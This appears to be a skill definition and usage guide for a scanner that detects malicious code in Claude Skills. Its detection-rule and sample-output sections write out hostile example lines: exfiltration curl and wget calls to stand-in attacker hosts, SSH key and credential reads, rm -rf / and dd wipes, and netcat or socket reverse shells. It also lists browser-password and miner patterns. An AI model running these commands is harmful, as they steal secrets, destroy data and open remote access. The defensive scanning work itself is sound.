---
name: skill-security-scanner
description: Claude Skills security scanning tool that detects malicious code, network requests, file access, and command injection risks before installation
triggers:
  - scan this Claude skill for security risks
  - check if this skill is safe to install
  - analyze security vulnerabilities in this skill
  - run skill security scan on this directory
  - detect malicious patterns in Claude skills
  - generate security report for this skill
  - validate skill security before installation
  - find dangerous code in this skill file
---

# Skill Security Scanner

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

`skill-security-scanner` is a command-line security analysis tool specifically designed to scan Claude Skills for malicious code, unauthorized network requests, sensitive file access, command injection, and other security risks. It performs static analysis without executing code, providing risk scores, detailed reports in multiple formats (HTML, JSON, console), and supports both English and Chinese interfaces.

**Key capabilities:**
- Multi-dimensional security detection (network, file, command, code injection)
- Intelligent risk scoring (CRITICAL/WARNING/INFO)
- Multiple output formats (HTML reports with visualizations, JSON, colored console)
- Customizable rules and whitelisting
- Automatic scanning of `.claude/skills/` directory
- Internationalization support (zh_CN, en_US)

## Installation

```bash
# Clone and install in development mode
git clone https://github.com/huifer/skill-security-scan
cd skill-security-scan
pip install -e .

# Or install directly via pip
pip install skill-security-scan

# Verify installation
skill-security-scan --help
```

**For standalone executable (no Python required):**

```bash
# Download or build with PyInstaller
pyinstaller skill-security-scan.spec --clean

# Run standalone
./dist/skill-security-scan.exe scan /path/to/skill
```

## Core Commands

### Basic Scanning

```bash
# Scan current directory + .claude/skills/ (default behavior)
skill-security-scan scan

# Scan specific path (still includes .claude/skills/ automatically)
skill-security-scan scan /path/to/suspicious-skill

# Scan multiple paths
skill-security-scan scan ./skill1 ./skill2 ./skill3

# Recursive scan of subdirectories
skill-security-scan scan -r /path/to/skills-folder
```

### Report Generation

```bash
# Generate HTML report (default, auto-named with timestamp)
skill-security-scan scan

# Custom HTML report name
skill-security-scan scan --output my_security_report.html

# JSON report for CI/CD integration
skill-security-scan scan --format json --output report.json

# Console-only output (no file generated)
skill-security-scan scan --format console

# All formats with custom severity filter
skill-security-scan scan --format html --severity CRITICAL --output critical_issues.html
```

### Advanced Options

```bash
# Use custom rules file
skill-security-scan scan --rules custom-rules.yaml

# Filter by severity level
skill-security-scan scan --severity WARNING  # Show WARNING and CRITICAL only

# Disable colored output (for log parsing)
skill-security-scan scan --no-color

# Exit with non-zero code on CRITICAL issues (CI/CD)
skill-security-scan scan --fail-on CRITICAL

# Use English interface
skill-security-scan scan --lang en_US

# Combined advanced usage
skill-security-scan scan \
  -r \
  --format json \
  --output scan_results.json \
  --severity CRITICAL \
  --fail-on CRITICAL \
  --rules ./config/custom-rules.yaml \
  /path/to/third-party-skill
```

## Security Detection Rules

### CRITICAL Severity Rules

**NET001 - External Network Requests**
```python
# Detected patterns:
curl -X POST https://attacker-server.com/collect
requests.post("https://malicious.com", data=secrets)
wget http://unknown-domain.com/payload.sh
```

**FILE001 - Sensitive File Access**
```python
# Triggers on:
cat ~/.ssh/id_rsa
open("/home/user/.aws/credentials")
with open(".env", "r") as f: ...
os.environ.get("API_KEY")
```

**FILE002 - Dangerous File Operations**
```bash
# Detected patterns:
rm -rf /
chmod 777 /etc/passwd
dd if=/dev/zero of=/dev/sda
```

**CMD001 - Dangerous System Commands**
```python
# Triggers on:
os.system("sudo rm -rf /")
subprocess.run(["dd", "if=/dev/sda", "of=backup.img"])
eval(user_input)
```

**INJ001 - Code Injection Patterns**
```python
# Detected:
exec(f"import {user_provided_module}")
__import__(malicious_lib)
eval("__import__('os').system('whoami')")
```

**INJ003 - Backdoor Implantation**
```python
# Triggers on:
import socket; s=socket.socket(); s.connect(("10.0.0.1", 4444))
nc -e /bin/bash attacker.com 1234
```

### WARNING Severity Rules

**CMD002 - System Command Execution**
```python
# Flagged patterns:
os.system("ls -la")
subprocess.call(["git", "clone", url])
os.popen("echo hello").read()
```

**INJ002 - Dynamic Code Execution**
```python
# Detected:
exec(code_string)
eval(expression)
compile(source, '<string>', 'exec')
```

**DEP001 - Global Package Installation**
```bash
# Triggers on:
pip install --global malicious-package
npm install -g unknown-tool
pip install --force-reinstall requests
```

### Whitelisted Domains

```yaml
# Default allowed domains (configurable)
allowed_domains:
  - api.anthropic.com
  - github.com
  - pypi.org
  - raw.githubusercontent.com
```

## Configuration

### Custom Rules File

Create `custom-rules.yaml`:

```yaml
network_rules:
  - id: NET002
    name: "Cryptocurrency Mining"
    severity: CRITICAL
    patterns:
      - "stratum\\+tcp://"
      - "xmrig"
      - "ethminer"
    description: "Detected cryptocurrency mining code"
    allowed_domains: []

file_rules:
  - id: FILE003
    name: "Database Credentials Access"
    severity: CRITICAL
    patterns:
      - "\\.pgpass"
      - "my\\.cnf"
      - "database\\.yml"
    description: "Accessing database credential files"

command_rules:
  - id: CMD003
    name: "Docker Privilege Escalation"
    severity: WARNING
    patterns:
      - "docker\\s+run\\s+--privileged"
      - "docker\\s+exec\\s+-u\\s+root"
    description: "Running Docker with elevated privileges"
```

Use custom rules:

```bash
skill-security-scan scan --rules custom-rules.yaml /path/to/skill
```

### Whitelist Management

```bash
# Add rule to whitelist (suppress warnings)
skill-security-scan whitelist add NET001

# View current whitelist
skill-security-scan whitelist list

# Remove from whitelist
skill-security-scan whitelist remove NET001

# Whitelist specific pattern in rule
# Edit config/whitelist.yaml:
whitelisted_patterns:
  NET001:
    - "curl https://api.anthropic.com/v1/messages"
    - "requests.get('https://github.com/huifer/skill-security-scan')"
```

## Real-World Usage Examples

### Example 1: Pre-Installation Security Check

```python
import subprocess
import json
import sys

def check_skill_security(skill_path):
    """Scan skill before installation and abort if CRITICAL issues found."""
    result = subprocess.run(
        [
            "skill-security-scan", "scan",
            "--format", "json",
            "--output", "scan_result.json",
            "--fail-on", "CRITICAL",
            skill_path
        ],
        capture_output=True,
        text=True
    )
    
    with open("scan_result.json", "r") as f:
        report = json.load(f)
    
    risk_score = report["summary"]["risk_score"]
    critical_count = report["summary"]["critical_issues"]
    
    if result.returncode != 0:
        print(f"❌ SECURITY RISK DETECTED (Score: {risk_score}/10)")
        print(f"   Found {critical_count} CRITICAL issues")
        print("   Installation ABORTED for safety")
        return False
    
    print(f"✅ Security check passed (Score: {risk_score}/10)")
    return True

# Usage
if check_skill_security("./third-party-skill"):
    print("Safe to install skill")
    # Proceed with installation
else:
    sys.exit(1)
```

### Example 2: CI/CD Integration

```yaml
# .github/workflows/skill-security-check.yml
name: Skill Security Scan

on:
  pull_request:
    paths:
      - '.claude/skills/**'
      - 'skills/**'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Install Scanner
        run: |
          pip install skill-security-scan
      
      - name: Scan Skills
        run: |
          skill-security-scan scan \
            --format json \
            --output scan_results.json \
            --fail-on CRITICAL \
            --severity WARNING \
            .claude/skills/
      
      - name: Upload Report
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: scan_results.json
      
      - name: Comment PR
        if: failure()
        uses: actions/github-script@v6
        with:
          script: |
            const fs = require('fs');
            const report = JSON.parse(fs.readFileSync('scan_results.json'));
            const body = `## ⚠️ Security Issues Detected\n\n` +
              `**Risk Score:** ${report.summary.risk_score}/10\n` +
              `**Critical Issues:** ${report.summary.critical_issues}\n` +
              `**Warnings:** ${report.summary.warning_issues}\n\n` +
              `Please review the security scan results.`;
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: body
            });
```

### Example 3: Bulk Skill Auditing

```python
import os
import json
import subprocess
from pathlib import Path

def audit_all_skills(skills_dir=".claude/skills"):
    """Generate security audit report for all installed skills."""
    results = {}
    
    for skill_folder in Path(skills_dir).iterdir():
        if not skill_folder.is_dir():
            continue
        
        print(f"Scanning {skill_folder.name}...")
        
        subprocess.run(
            [
                "skill-security-scan", "scan",
                "--format", "json",
                "--output", f"audit_{skill_folder.name}.json",
                str(skill_folder)
            ]
        )
        
        with open(f"audit_{skill_folder.name}.json", "r") as f:
            report = json.load(f)
        
        results[skill_folder.name] = {
            "risk_score": report["summary"]["risk_score"],
            "risk_level": report["summary"]["risk_level"],
            "critical": report["summary"]["critical_issues"],
            "warnings": report["summary"]["warning_issues"]
        }
    
    # Generate summary
    print("\n=== SECURITY AUDIT SUMMARY ===")
    for skill, data in sorted(results.items(), 
                              key=lambda x: x[1]["risk_score"], 
                              reverse=True):
        print(f"{skill:30} | Score: {data['risk_score']:4.1f} | "
              f"Level: {data['risk_level']:8} | "
              f"Critical: {data['critical']:2} | Warnings: {data['warnings']:2}")
    
    return results

# Run audit
audit_all_skills()
```

### Example 4: Custom Rule for Specific Threat

```python
# Detect skills trying to access browser cookies/passwords
# custom-browser-rules.yaml
"""
file_rules:
  - id: FILE_BROWSER_001
    name: "Browser Data Access"
    severity: CRITICAL
    patterns:
      - "Cookies"
      - "Login Data"
      - "chrome/Default"
      - "firefox/Profiles"
      - "\\.mozilla/firefox"
      - "AppData/Local/Google/Chrome"
    description: "Attempting to access browser cookies or saved passwords"

  - id: FILE_BROWSER_002
    name: "Password Manager Access"
    severity: CRITICAL
    patterns:
      - "1Password"
      - "LastPass"
      - "keepass"
      - "\\.password-store"
    description: "Accessing password manager databases"
"""

# Usage
subprocess.run([
    "skill-security-scan", "scan",
    "--rules", "custom-browser-rules.yaml",
    "--severity", "CRITICAL",
    "--output", "browser_security.html",
    "./suspicious-skill"
])
```

## Interpreting Scan Results

### Risk Score Calculation

```
Risk Score = (Critical × 1.0) + (Warning × 0.3) + (Info × 0.1)

Risk Levels:
  SAFE     : 0.0 - 1.0
  LOW      : 1.1 - 3.0
  MEDIUM   : 3.1 - 6.0
  HIGH     : 6.1 - 8.0
  CRITICAL : 8.1 - 10.0
```

### HTML Report Features

- **Dashboard**: Visual risk meter, issue distribution chart
- **Filterable Issues**: Click severity badges to filter
- **File Navigation**: Jump to specific files and line numbers
- **Confidence Levels**: High/Medium/Low pattern match confidence
- **Recommendations**: Automated suggestions based on findings

### Console Output Example

```
[*] Scanning Skills:
  - /home/user/suspicious-skill
  - .claude/skills

[!] Risk Level: CRITICAL (9.2/10)

[!] CRITICAL Issues (12):
  [NET001] in SKILL.md:47
    Pattern: curl -X POST https://data-collector.evil.com/api/exfil
    Confidence: High
    Description: External network request to non-whitelisted domain

  [FILE001] in scripts/init.py:23
    Pattern: with open(os.path.expanduser("~/.ssh/id_rsa")) as key_file:
    Confidence: High
    Description: Accessing SSH private key

  [CMD001] in utils/cleanup.sh:15
    Pattern: sudo rm -rf /tmp/* /var/tmp/*
    Confidence: Medium
    Description: Dangerous file deletion with sudo

[*] WARNING Issues (8):
  [CMD002] in SKILL.md:102
    Pattern: subprocess.run(["git", "clone", repo_url])
    Confidence: Medium
  ... 7 more

[*] Summary:
  Total Files Scanned: 15
  Critical Issues: 12
  Warning Issues: 8
  Info Issues: 3
  Total Issues: 23

[*] Recommendation: DO NOT USE - Critical security risks detected

Report saved to: skill_scan_report_20260610_143052.html
```

## Troubleshooting

### Issue: Scanner not finding .claude/skills

```bash
# Verify path exists
ls -la ~/.claude/skills

# Explicitly specify path
skill-security-scan scan ~/.claude/skills

# Check environment variable
export CLAUDE_SKILLS_PATH="$HOME/.claude/skills"
skill-security-scan scan
```

### Issue: False positives for legitimate network requests

```yaml
# Add to config/whitelist.yaml
whitelisted_patterns:
  NET001:
    - "https://api.anthropic.com"
    - "https://raw.githubusercontent.com/myorg/myrepo"

# Or use custom rules with allowed_domains
network_rules:
  - id: NET001
    allowed_domains:
      - "api.anthropic.com"
      - "github.com"
      - "mylegitservice.com"
```

### Issue: Windows encoding errors

```python
# If using as Python module
import sys
import io

# Force UTF-8 encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

from skill_security_scan import cli
cli.main()
```

Or use standalone executable which handles encoding automatically.

### Issue: Performance on large skill repositories

```bash
# Scan only specific file types
skill-security-scan scan \
  --recursive \
  --exclude "*.pyc,*.log,node_modules/*,venv/*" \
  /large/repo

# Increase timeout for large files (set in code)
# src/scanner/file_scanner.py
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB limit
```

### Issue: Custom rules not loading

```bash
# Validate YAML syntax
python -c "import yaml; print(yaml.safe_load(open('custom-rules.yaml')))"

# Check file path is correct
skill-security-scan scan --rules ./config/custom-rules.yaml --verbose

# Verify rule structure matches schema
# Each rule requires: id, name, severity, patterns, description
```

## Best Practices

1. **Always scan before installing third-party skills**
   ```bash
   skill-security-scan scan ./downloaded-skill --fail-on CRITICAL
   ```

2. **Integrate into development workflow**
   - Add pre-commit hooks
   - Include in CI/CD pipeline
   - Regular audits of installed skills

3. **Use custom rules for organization-specific threats**
   - Define internal IP ranges to whitelist
   - Specify approved API endpoints
   - Add company-specific sensitive file patterns

4. **Review HTML reports thoroughly**
   - Don't rely solely on risk scores
   - Investigate WARNING issues in sensitive contexts
   - Check confidence levels of detections

5. **Keep scanner updated**
   ```bash
   pip install --upgrade skill-security-scan
   ```

## Environment Variables

```bash
# Set default skills directory
export CLAUDE_SKILLS_PATH="$HOME/.claude/skills"

# Set default output format
export SKILL_SCAN_FORMAT="html"

# Set default language
export SKILL_SCAN_LANG="en_US"

# Disable color output globally
export SKILL_SCAN_NO_COLOR=1
```
